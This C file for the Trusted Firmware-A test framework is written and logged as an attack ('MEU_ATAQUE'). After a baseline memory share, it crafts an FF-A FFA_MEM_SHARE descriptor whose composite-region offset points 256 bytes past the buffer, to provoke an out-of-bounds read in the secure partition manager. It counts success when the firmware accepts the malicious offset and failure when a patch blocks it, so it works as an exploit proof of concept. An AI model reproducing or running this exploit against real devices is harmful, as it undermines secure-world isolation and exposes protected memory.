#include <stdlib.h>
#include <string.h>
#include <tftf.h>
#include <ffa.h>
#include <ffa_helpers.h>

#define SENDER_ID    0x8000
#define RECEIVER_ID  0x8001

test_result_t test_ffa_oob_read_mem_share(void)
{
    smc_ret_values ffa_ret;
    struct ffa_mem_region *mem_region;
    uint32_t total_size = 0;
    uint32_t frag_length = 0;
    
    static uint8_t tx_buffer[4096] __aligned(4096);
    static uint8_t rx_buffer[4096] __aligned(4096);

    /* 1. Mapear RXTX */
    ffa_ret = ffa_rxtx_map((uintptr_t)tx_buffer, (uintptr_t)rx_buffer, 1);
    if (ffa_ret.ret0 != FFA_SUCCESS_SMC32) {
        ERROR("[MEU_ATAQUE] RXTX_MAP falhou\n");
        return TEST_RESULT_FAIL;
    }

    /* 2. Montar descritor BASELINE */
    memset(tx_buffer, 0, sizeof(tx_buffer));
    mem_region = (struct ffa_mem_region *)tx_buffer;
    ffa_memory_region_init(
        mem_region, sizeof(tx_buffer),
        SENDER_ID, RECEIVER_ID,
        0, 0,
        FFA_MEMORY_NORMAL_MEM, FFA_MEMORY_CACHE_WB,
        FFA_MEMORY_SHARE, NULL, 0,
        &total_size, &frag_length
    );

    /* 3. Aperto de mão Baseline */
    INFO("[MEU_ATAQUE] Enviando Baseline...\n");
    ffa_ret = ffa_mem_share(frag_length, frag_length, 0, 0);
    if (ffa_ret.ret0 != FFA_SUCCESS_SMC32) {
        ERROR("[MEU_ATAQUE] Baseline falhou! Erro: %d\n", ffa_ret.ret2);
        return TEST_RESULT_FAIL;
    }
    INFO("[MEU_ATAQUE] Baseline PASSOU: handle=0x%x\n", ffa_ret.ret2);

    /* 4. Preparar Atque OOB */
    memset(tx_buffer, 0, sizeof(tx_buffer));
    mem_region = (struct ffa_mem_region *)tx_buffer;
    ffa_memory_region_init(
        mem_region, sizeof(tx_buffer),
        SENDER_ID, RECEIVER_ID,
        0, 0,
        FFA_MEMORY_NORMAL_MEM, FFA_MEMORY_CACHE_WB,
        FFA_MEMORY_SHARE, NULL, 0,
        &total_size, &frag_length
    );

    /* Manipulação direta de memória (Offset 20 = composite_mem_region_offset na FF-A 1.1) */
    uint32_t *composite_offs_ptr = (uint32_t *)(tx_buffer + 20);
    *composite_offs_ptr = frag_length + 256;
    uint32_t malicious_frag_len = frag_length + 256;

    /* 5. Enviar Ataque */
    INFO("[MEU_ATAQUE] Enviando FFA_MEM_SHARE Malicioso (Offset OOB)...\n");
    ffa_ret = ffa_mem_share(malicious_frag_len, malicious_frag_len, 0, 0);

    if (ffa_ret.ret0 == FFA_ERROR) {
        ERROR("[MEU_ATAQUE] SPMC rejeitou o ataque. Erro: %d\n", ffa_ret.ret2);
        if (ffa_ret.ret2 == FFA_ERROR_INVALID_PARAMETERS) {
            INFO("[MEU_ATAQUE] Retornou -2. O Patch bloqueou o OOB.\n");
        }
        return TEST_RESULT_FAIL;
    }

    INFO("[MEU_ATAQUE] SUCESSO! SPMC processou o offset malicioso.\n");
    return TEST_RESULT_SUCCESS;
}
